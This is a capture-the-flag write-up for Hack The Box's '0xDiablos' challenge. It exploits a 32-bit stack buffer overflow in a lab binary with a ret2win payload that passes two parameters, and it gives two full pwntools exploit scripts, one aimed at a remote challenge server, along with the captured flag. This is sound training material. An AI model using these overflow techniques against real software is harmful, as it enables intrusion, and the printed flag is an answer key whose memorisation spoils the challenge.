# You know 0xDiablos
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fcede4ab-f544-4479-91f0-a17bcac7b14e)

## Lessons Learned:
1. Stack-Based Exploitation.
2. Implement ret2win attack with 2 parameters.

## DESCRIPTION:
I missed my flag


## STEPS:
1. First unzip the file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207644786-2b71a2bc-31f0-41b8-a85e-cd0c08f73f45.png)


2. Let's try to unzip it using `7z`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207645014-3ceb1439-e40d-401c-9bac-cf5ff74e6319.png)


3. Check the file type and the binary's protection.

> FILE TYPE

![image](https://user-images.githubusercontent.com/70703371/207645137-32ecbc90-2592-4b19-b6df-dd9f5df8ce9f.png)


```
32 Bit file, dynamically linked and not stripped.
```

> FILE'S PROTECTION

![image](https://user-images.githubusercontent.com/70703371/207645250-d4f9fb33-affa-423e-9ced-5d3e598f6897.png)


4. Now let's make the file executeable first by run `chmod +x vuln`, then run the file.

> INPUT ANY LENGTH OF A'S - RESULT

![image](https://user-images.githubusercontent.com/70703371/207646431-c05472b6-a7a9-4d81-b232-86bf038355c9.png)


5. As we know, since there's **no canary found**, then we can overflow the buffer.
6. I opened GDB and copied 1024 cyclic pattern, then run the file.

> GDB

![image](https://user-images.githubusercontent.com/70703371/207648015-176a3305-6214-49c3-93e5-1b13789cd213.png)


![image](https://user-images.githubusercontent.com/70703371/207648543-ac71b49a-166f-4bb2-801a-5b79be6a2c2b.png)


7. Copy the 4 chars in **EIP** , then do `cyclic -l waab`

```
EIP stands for Extended Instruction Pointer.
```

![image](https://user-images.githubusercontent.com/70703371/207649036-6d15d6e0-d67f-4ff3-813a-5594fa0f3660.png)


![image](https://user-images.githubusercontent.com/70703371/207649107-2487380c-4c9c-48ff-b372-032d07887552.png)


8. Now we know, we need to add 188 bytes as the padding.
9. Next, let's decompile the binary using ghidra.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207650199-f2fbdcf8-f495-478a-af85-edf6cbd5b5cb.png)


10. Check the `flag()` function.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207650433-f2e6fe7e-7228-4f7c-829f-2c9ed0468f99.png)


11. Since the `flag()` function has parameters, then we can conclude it's a ret2win concept but with parameters.
12. To do ret2win with param in 32 Bit, the payload shall look like this:

```
padding + flagAddr + returnAddress + param1 + param2
```

13. Copy the param1 and param2 value.

> PARAM 1 & PARAM 2 (BOTH IN CHAR FORMAT)

![image](https://user-images.githubusercontent.com/70703371/207764429-ab1cbfe6-071b-4653-b900-73dd82c01f24.png)


14. For the return address, we want to return to the main() function just for safety. But actually you can add 4 bytes of characters as a junk.
15. So this is the final script:

```py
from pwn import *
import os

'''
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


#gdbscript = '''
#init-pwndbg
#continue
'''.format(**locals())
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
'''

os.system('clear')

context.log_level = 'debug'

sh = remote('157.245.35.145', 32410)
flagAddr = 134517218 # 0x80491e2
param1 = 3735928559 # 0xdeadbeef
param2 = 3235827725 # 0xc0ded00d
p = b'A' * 188 
p += p32(flagAddr)
p += p32(134517425) #0x80492b1 
p += p32(param1)
p += p32(param2)
sh.recvuntil("\n")
sh.sendline(p)

sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/207765889-37a0079a-581a-4746-b1c9-673a1e26fa48.png)


16. Got the flag!


## FLAG

```
HTB{0ur_Buff3r_1s_not_healthy}
```

## ALTERNATE SOLVER

> using ropstar

```py
import os
from pwn import *

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()

padding = asm('nop') * 188 # EIP OFFSET

rop = ROP(elf)

rop.flag(0xdeadbeef, 0xc0ded00d)

send = padding + rop.chain()

sh.sendline(send)

get = sh.recvall()
print(get)

print(rop.dump())

sh.interactive()
```


